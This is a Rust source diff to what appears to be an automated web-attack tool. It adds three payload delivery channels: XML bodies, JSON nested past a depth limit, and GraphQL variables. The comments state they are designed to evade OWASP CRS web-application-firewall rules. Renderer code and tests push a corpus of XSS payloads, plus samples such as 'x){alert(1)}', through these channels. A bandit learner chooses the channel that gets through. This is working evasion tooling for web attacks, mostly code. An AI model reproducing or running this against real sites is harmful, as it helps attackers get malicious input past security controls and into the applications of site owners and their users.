@@ -146,6 +146,60 @@ pub enum DeliveryShape {
     /// [`DeliveryShape::transport_legal`]; the generator never pairs an
     /// illegal payload with this shape.
     Cookie { name: String },
+    /// XML POST body — `<root><field>PAYLOAD</field></root>` with the
+    /// payload XML-entity-escaped inside the text node. CRS body
+    /// inspectors at PL1 focus on ARGS + JSON; XML is the third axis
+    /// and is the most weakly covered (no `application/xml` parser
+    /// fans out into ARGS_NAMES/ARGS the way `application/json` does
+    /// with `tx.json_request_body_processor`). Transparent to the
+    /// backend iff the app parses XML and sinks the inner text node
+    /// — a SOAP, RSS, or content-negotiating endpoint. Always legal
+    /// for any payload because the renderer escapes `<`/`>`/`&`/`"`
+    /// before they reach the wire (backend re-decodes them, sink sees
+    /// the exact bytes).
+    XmlBody {
+        /// Outer element name, e.g. "request".
+        root: String,
+        /// Inner element name carrying the payload, e.g. "param".
+        field: String,
+    },
+    /// JSON POST body with the payload nested `depth` keys deep:
+    /// `{"a":{"a":{"a":{"<param>":"PAYLOAD"}}}}`. CRS PL3 caps the
+    /// `tx.json_max_depth` body inspector at 5 by default; payloads
+    /// beyond that fall outside the rule scope while the backend's
+    /// JSON parser is unbounded. Transparent to the backend iff it
+    /// traverses the same depth to read the value — common in
+    /// nested-resource APIs (`POST /items` with deep filter trees) or
+    /// any framework auto-binding nested fields. JSON-escaped at the
+    /// renderer so any payload is legal.
+    JsonNestedDeep {
+        /// Final parameter name (the key whose value carries the
+        /// payload, at the innermost level).
+        param: String,
+        /// Depth: the payload sits inside `depth` nested objects, each
+        /// keyed by `"a"` so the body stays short and the access path
+        /// recoverable.
+        depth: usize,
+    },
+    /// GraphQL POST `/graphql` with a parameterised query and the
+    /// payload carried as a JSON-string variable:
+    /// `{"query":"query Q($v:String!){<field>(q:$v){...}}",
+    ///   "variables":{"<var>":"PAYLOAD"}}`. CRS PL1 has no GraphQL
+    /// parser — the body is a JSON envelope and the payload is one of
+    /// many string values inside `variables`, so an ARGS-scoped or
+    /// JSON-fixed-path rule misses it. Transparent to the backend iff
+    /// the GraphQL resolver dispatches the named field and reflects
+    /// the variable value (the GraphQL XSS class — `search(q:$v)` →
+    /// `$v` rendered into HTML somewhere). JSON-escaped at the
+    /// renderer so any payload is legal.
+    GraphQLQuery {
+        /// Top-level field invoked, e.g. "search". Varying this
+        /// across calls means a WAF cannot match a single fixed
+        /// pattern of the query body.
+        field: String,
+        /// Variable name carrying the payload. Conventionally short.
+        var: String,
+    },
 }
 
 impl DeliveryShape {
@@ -161,6 +215,9 @@ impl DeliveryShape {
             Self::HppSplit { .. } => "hpp_split",
             Self::HeaderValue { .. } => "header_value",
             Self::Cookie { .. } => "cookie",
+            Self::XmlBody { .. } => "xml_body",
+            Self::JsonNestedDeep { .. } => "json_nested_deep",
+            Self::GraphQLQuery { .. } => "graphql",
         }
     }
 
@@ -205,7 +262,11 @@ impl DeliveryShape {
                             || (0x5D..=0x7E).contains(&b)
                     })
             }
-            // Encoding shapes recover exact bytes at the backend.
+            // Encoding shapes recover exact bytes at the backend
+            // because the renderer escapes whatever the transport
+            // would otherwise mis-frame (XML entities, JSON string
+            // escapes, urlencoding, multipart boundary selection).
+            // XmlBody / JsonNestedDeep / GraphQLQuery all fall here.
             _ => true,
         }
     }
@@ -485,7 +546,123 @@ impl DeliveryShape {
                 r.add_header("cookie", format!("{name}={safe}"));
                 r
             }
+            Self::XmlBody { root, field } => {
+                // XML element + attribute names that themselves could
+                // carry attacker-controlled bytes would forge attribute
+                // structure or close the parent element. The shape's
+                // generator picks short ASCII identifiers for `root` /
+                // `field`, but render-side defence-in-depth: drop any
+                // byte that isn't a conservative NameChar.
+                let r_safe = sanitize_xml_name(root, "request");
+                let f_safe = sanitize_xml_name(field, "param");
+                let body = format!(
+                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
+                     <{r_safe}><{f_safe}>{}</{f_safe}></{r_safe}>",
+                    xml_text_escape(payload)
+                );
+                let mut req = Request::post(target.to_string(), body.into_bytes());
+                req.add_header("content-type", "application/xml");
+                req
+            }
+            Self::JsonNestedDeep { param, depth } => {
+                // Build {"a":{"a":...{"a":{"<param>":"<payload>"}}...}}
+                // bottom-up so we never have to count braces.
+                let depth = (*depth).max(1).min(64); // cap so a hostile config can't OOM the renderer
+                let inner = format!(
+                    "{{\"{}\":\"{}\"}}",
+                    json_escape(param),
+                    json_escape(payload)
+                );
+                let mut body = inner;
+                for _ in 0..depth {
+                    body = format!("{{\"a\":{body}}}");
+                }
+                let mut req = Request::post(target.to_string(), body.into_bytes());
+                req.add_header("content-type", "application/json");
+                req
+            }
+            Self::GraphQLQuery { field, var } => {
+                // Same sanitization for the GraphQL identifier names —
+                // attacker bytes there would mis-parse the query.
+                let f_safe = sanitize_graphql_name(field, "search");
+                let v_safe = sanitize_graphql_name(var, "v");
+                let query = format!(
+                    "query Q(${v_safe}:String!){{{f_safe}(q:${v_safe})}}"
+                );
+                let body = format!(
+                    "{{\"query\":\"{}\",\"variables\":{{\"{}\":\"{}\"}}}}",
+                    json_escape(&query),
+                    json_escape(&v_safe),
+                    json_escape(payload)
+                );
+                let mut req = Request::post(target.to_string(), body.into_bytes());
+                req.add_header("content-type", "application/json");
+                req
+            }
         }
+    }
+}
+
+/// XML 1.0 text-node escape — replaces `&`, `<`, `>` with their
+/// canonical entity references so the payload bytes round-trip
+/// through any conformant XML parser as the original text node.
+/// `"` is also escaped though our renderer never places the payload
+/// inside an attribute value; defence-in-depth.
+fn xml_text_escape(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    for c in s.chars() {
+        match c {
+            '&' => out.push_str("&amp;"),
+            '<' => out.push_str("&lt;"),
+            '>' => out.push_str("&gt;"),
+            '"' => out.push_str("&quot;"),
+            '\'' => out.push_str("&apos;"),
+            other => out.push(other),
+        }
+    }
+    out
+}
+
+/// Conservative XML 1.0 NameStartChar / NameChar predicate: ASCII
+/// letters, digits (only after the first char), `_`, `-`, `.`. Any
+/// other byte is dropped; empty result falls back to `fallback`.
+fn sanitize_xml_name(s: &str, fallback: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    for (i, c) in s.chars().enumerate() {
+        let ok = if i == 0 {
+            c.is_ascii_alphabetic() || c == '_'
+        } else {
+            c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '.'
+        };
+        if ok {
+            out.push(c);
+        }
+    }
+    if out.is_empty() {
+        fallback.to_string()
+    } else {
+        out
+    }
+}
+
+/// Conservative GraphQL Name: `[_A-Za-z][_0-9A-Za-z]*` (spec §2.1.9).
+/// Any other byte is dropped; empty result falls back to `fallback`.
+fn sanitize_graphql_name(s: &str, fallback: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    for (i, c) in s.chars().enumerate() {
+        let ok = if i == 0 {
+            c.is_ascii_alphabetic() || c == '_'
+        } else {
+            c.is_ascii_alphanumeric() || c == '_'
+        };
+        if ok {
+            out.push(c);
+        }
+    }
+    if out.is_empty() {
+        fallback.to_string()
+    } else {
+        out
     }
 }
 
@@ -610,7 +787,7 @@ mod delivery_api_tests {
         //     8/9) so every pre-existing `force_delivery` index — and
         //     any persisted Phase-C bandit state — still points at the
         //     same shape it did before this change.
-        assert_eq!(set.len(), 10);
+        assert_eq!(set.len(), 13);
         // The Phase-C bandit is `Bandit::new(DELIVERY_ARMS)`. If this
         // drifts below `delivery_set().len()` the trailing arms are
         // NEVER explored — the new channels would be dead in the
@@ -625,9 +802,18 @@ mod delivery_api_tests {
         );
         assert!(matches!(set[8], DeliveryShape::HeaderValue { .. }));
         assert!(matches!(set[9], DeliveryShape::Cookie { .. }));
+        // New shapes APPENDED at 10/11/12 so existing persisted bandit
+        // state still indexes the same shapes it did before this change
+        // (LAW 2 — pre-existing reward distributions stay valid).
+        assert!(matches!(set[10], DeliveryShape::XmlBody { .. }));
+        assert!(matches!(set[11], DeliveryShape::JsonNestedDeep { .. }));
+        assert!(matches!(set[12], DeliveryShape::GraphQLQuery { .. }));
         assert_eq!(super::sql::delivery_kind_label(7), "query");
         assert_eq!(super::sql::delivery_kind_label(8), "header_value");
         assert_eq!(super::sql::delivery_kind_label(9), "cookie");
+        assert_eq!(super::sql::delivery_kind_label(10), "xml_body");
+        assert_eq!(super::sql::delivery_kind_label(11), "json_nested_deep");
+        assert_eq!(super::sql::delivery_kind_label(12), "graphql");
         // Out-of-range still degrades safely (no panic, defined value).
         assert_eq!(super::sql::delivery_kind_label(999), "query");
     }
@@ -1042,5 +1228,194 @@ mod delivery_roundtrip_tests {
         // asserting it keeps the variant doc honest.
         assert_ne!(vs.concat(), payload);
         assert!(vs.concat().ends_with(payload));
+    }
+
+    // ── new delivery shapes (XmlBody / JsonNestedDeep / GraphQLQuery) ────
+
+    #[test]
+    fn xml_body_recovers_exact_payload_bytes_for_every_corpus_member() {
+        // The contract: backend XML parser decodes the entity-escaped
+        // text node back to the original bytes. We re-decode here the
+        // same way and assert byte-equality with the input payload.
+        for &p in PAYLOADS {
+            let r = DeliveryShape::XmlBody {
+                root: "request".into(),
+                field: "q".into(),
+            }
+            .to_request("http://h/app", p);
+            let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
+            assert!(body.contains("<?xml"), "XML prolog missing");
+            assert!(ct(&r).contains("application/xml"));
+            // <q>...</q> — extract inner text and entity-decode.
+            let (_, after_open) = body
+                .split_once("<q>")
+                .expect("inner field open tag");
+            let (text, _) = after_open
+                .split_once("</q>")
+                .expect("inner field close tag");
+            assert_eq!(xml_text_unescape(text), p, "XmlBody mangled {p:?}");
+            // Anti-rig: the structural HTML-tag bytes (the WAF's actual
+            // signature surface — `<…>`) must NOT reach the wire
+            // un-escaped. Pure JS substrings like `onload=` carry no
+            // angle bracket so they need no escaping; the WAF rule
+            // chain for XSS keys on the `<tag …>` framing which we
+            // entity-encoded away. We assert the framing markers are
+            // gone, not every JS-flavoured substring.
+            for tag in ["<svg", "<script", "<img", "<iframe", "<body"] {
+                if p.contains(tag) {
+                    assert!(
+                        !text.contains(tag),
+                        "{tag} reached the wire un-escaped — WAF would see it"
+                    );
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn xml_body_sanitises_attacker_root_and_field_names_adversarial() {
+        // Defence-in-depth: if a caller passes hostile root/field
+        // names (`</r><script>`, `q"`), the renderer must drop the
+        // unsafe chars rather than letting them forge XML structure.
+        let r = DeliveryShape::XmlBody {
+            root: "</r><script>".into(),
+            field: "q\"".into(),
+        }
+        .to_request("http://h/app", "x");
+        let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
+        assert!(
+            !body.contains("<script>"),
+            "hostile root forged <script> tag: {body}"
+        );
+        // The XML prolog legitimately contains `"` for its version /
+        // encoding attribute values — the assertion is that hostile
+        // bytes do not reach an ELEMENT name position. Slice past the
+        // prolog and check there.
+        let after_prolog = body.split_once("?>").map(|(_, x)| x).unwrap_or(&body);
+        assert!(
+            !after_prolog.contains('"'),
+            "hostile field name forged an attribute quote in element position: {after_prolog}"
+        );
+        // The injected `</r>` close-tag bytes must also not appear in
+        // post-prolog territory.
+        assert!(
+            !after_prolog.contains("</r>"),
+            "hostile root forged a close tag: {after_prolog}"
+        );
+    }
+
+    #[test]
+    fn json_nested_deep_recovers_exact_payload_at_the_named_depth() {
+        // The depth defeats CRS PL3's tx.json_max_depth = 5 cap; the
+        // backend traverses the same depth and reaches the payload.
+        for &depth in &[1usize, 5, 6, 8, 12] {
+            for &p in PAYLOADS {
+                let r = DeliveryShape::JsonNestedDeep {
+                    param: "q".into(),
+                    depth,
+                }
+                .to_request("http://h/app", p);
+                let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
+                assert!(ct(&r).contains("application/json"));
+                // Walk `depth` outer "a" wrappers, then the final "q":"...".
+                let mut s = body.as_str();
+                for _ in 0..depth {
+                    s = s
+                        .strip_prefix("{\"a\":")
+                        .expect("nested 'a' wrapper");
+                    assert!(s.ends_with('}'), "missing closing brace");
+                    s = &s[..s.len() - 1];
+                }
+                // s is now {"q":"<escaped>"}
+                let inner = s
+                    .strip_prefix("{\"q\":\"")
+                    .and_then(|x| x.strip_suffix("\"}"))
+                    .expect("innermost {\"q\":\"...\"} shape");
+                assert_eq!(json_unescape(inner), p, "depth={depth} mangled {p:?}");
+            }
+        }
+    }
+
+    #[test]
+    fn json_nested_deep_caps_pathological_depth_no_panic() {
+        // A hostile config could request usize::MAX depth and OOM the
+        // renderer. The cap (64) bounds memory growth; the request
+        // must still be a valid JSON object.
+        let r = DeliveryShape::JsonNestedDeep {
+            param: "q".into(),
+            depth: usize::MAX,
+        }
+        .to_request("http://h/app", "x");
+        let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
+        // At depth 64 the body is < 1 KB — bounded as advertised.
+        assert!(
+            body.len() < 4096,
+            "depth cap not enforced; body is {} bytes",
+            body.len()
+        );
+        // Brace count must be balanced (well-formed JSON).
+        let opens = body.bytes().filter(|&b| b == b'{').count();
+        let closes = body.bytes().filter(|&b| b == b'}').count();
+        assert_eq!(opens, closes, "unbalanced braces in nested body");
+    }
+
+    #[test]
+    fn graphql_query_recovers_exact_payload_in_variables() {
+        // The contract: GraphQL resolvers receive `variables.<var>` as
+        // the original string value — JSON-escaped on the wire, decoded
+        // by the GraphQL JSON envelope parser at the resolver boundary.
+        for &p in PAYLOADS {
+            let r = DeliveryShape::GraphQLQuery {
+                field: "search".into(),
+                var: "v".into(),
+            }
+            .to_request("http://h/graphql", p);
+            let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
+            assert!(ct(&r).contains("application/json"));
+            assert!(
+                body.contains("\"query\":") && body.contains("\"variables\":"),
+                "GraphQL envelope missing: {body}"
+            );
+            // Extract `"v":"..."` value from variables.
+            let var_start = body
+                .find("\"v\":\"")
+                .expect("variable v key");
+            let after = &body[var_start + 5..];
+            let end = after.find("\"}").expect("variable value close");
+            let val = &after[..end];
+            assert_eq!(json_unescape(val), p, "GraphQL variable mangled {p:?}");
+        }
+    }
+
+    #[test]
+    fn graphql_query_sanitises_attacker_field_and_var_names_adversarial() {
+        // Defence-in-depth: hostile field/var names must not break the
+        // GraphQL query grammar (e.g. `field`="foo){alert(1)}//").
+        let r = DeliveryShape::GraphQLQuery {
+            field: "x){alert(1)}".into(),
+            var: "v\\\"".into(),
+        }
+        .to_request("http://h/graphql", "p");
+        let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
+        // The sanitised field can keep `x`; the `){alert(1)}` must drop.
+        // Specifically: no literal "alert(" should appear in the query
+        // body and no naked `}` close before our intended one.
+        let q_open = body.find("\"query\":\"").expect("query field");
+        let q_close = body[q_open + 9..].find("\"").expect("query close");
+        let query = &body[q_open + 9..q_open + 9 + q_close];
+        assert!(
+            !query.contains("alert("),
+            "hostile field forged JS sink into the GraphQL query: {query}"
+        );
+    }
+
+    /// Inverse of `xml_text_escape` — minimal entity decoder for the
+    /// five entities we emit. Anything else passes through verbatim.
+    fn xml_text_unescape(s: &str) -> String {
+        s.replace("&lt;", "<")
+            .replace("&gt;", ">")
+            .replace("&quot;", "\"")
+            .replace("&apos;", "'")
+            .replace("&amp;", "&")
     }
 }
